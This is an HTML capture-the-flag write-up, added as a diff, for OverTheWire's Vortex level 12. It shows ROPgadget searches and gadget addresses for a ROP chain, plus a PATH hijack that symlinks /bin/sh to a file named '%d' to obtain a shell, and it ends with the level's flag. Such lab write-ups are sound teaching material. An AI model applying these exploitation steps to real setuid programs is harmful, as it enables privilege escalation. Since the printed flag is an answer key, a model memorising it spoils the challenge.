@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>vortex12 | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="vortex12" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/overthewire/vortex/vortex12.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/overthewire/vortex/vortex12.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="vortex12" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"vortex12","url":"http://localhost:4000/CTF_writeups/overthewire/vortex/vortex12.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p>in this challenge we need to use ROP chain in order to exploit the buffer overflow. 
+we will find our gadgets in <em>libc.so.6</em>, and in <em>ld-linux.so.2</em>.</p>
+
+<p>using this command we can see where every file is loaded:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldd /vortex/vortex12
+</code></pre></div></div>
+<p>/lib/i386-linux-gnu/libc.so.6 (<strong>0xf7d7d000</strong>)
+/lib/ld-linux.so.2 (<strong>0xf7fc9000</strong>)</p>
+
+<p>find “pop eax”, “pop edx”, in libc.so.6</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 --only "pop|ret" | grep -E "pop (eax|edx) ; ret"
+</code></pre></div></div>
+<ul>
+  <li>pop eax -&gt; 0x0012b311 (in <strong>libc.so.6</strong>)</li>
+  <li>pop edx -&gt; 0x0003be0d (in <strong>libc.so.6</strong>)</li>
+</ul>
+
+<p>then, find “mov [edx], eax”, in ld-linux.so.2</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ROPgadget --binary /lib/ld-linux.so.2 --only "mov|ret" | grep -E "mov .* \[edx\], eax ; ret"
+</code></pre></div></div>
+<p><img src="/CTF_writeups/overthewire/vortex/images/level12_2.png" alt="image" /></p>
+
+<ul>
+  <li>mov [edx], eax -&gt; 0x0001250b (in <strong>ld-linux.so.2</strong>)</li>
+</ul>
+
+<p>we only need to call exit, so, first let’s find “mov eax, 1”.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 --only "mov|ret" | grep -E "mov eax, 1"
+</code></pre></div></div>
+<ul>
+  <li>mov eax, 1 -&gt; 0x0005cdb5 (in <strong>libc.so.6</strong>)</li>
+</ul>
+
+<p>and then, call the kernel using “int 0x80”.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 --only "int"
+</code></pre></div></div>
+<ul>
+  <li>int 0x80 -&gt; 0x00039ed4 (in <strong>libc.so.6</strong>)</li>
+</ul>
+
+<p>now, we can see it tries to run this command, <code class="language-plaintext highlighter-rouge">system("%d")</code><br />
+<img src="/CTF_writeups/overthewire/vortex/images/level12_3.png" alt="image" /></p>
+
+<p>first we need to adjust the PATH variable:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export PATH=.:$PATH
+</code></pre></div></div>
+
+<p>and then, create link to <code class="language-plaintext highlighter-rouge">/bin/sh</code> using this command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ln -sf /bin/sh "%d"
+</code></pre></div></div>
+
+<p>finally :)</p>
+
+<p><img src="/CTF_writeups/overthewire/vortex/images/level12_4.png" alt="image" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">kklZMRIrj</code></em></strong></p>
+
+      </section>
+    </div>
+  </body>
+</html>
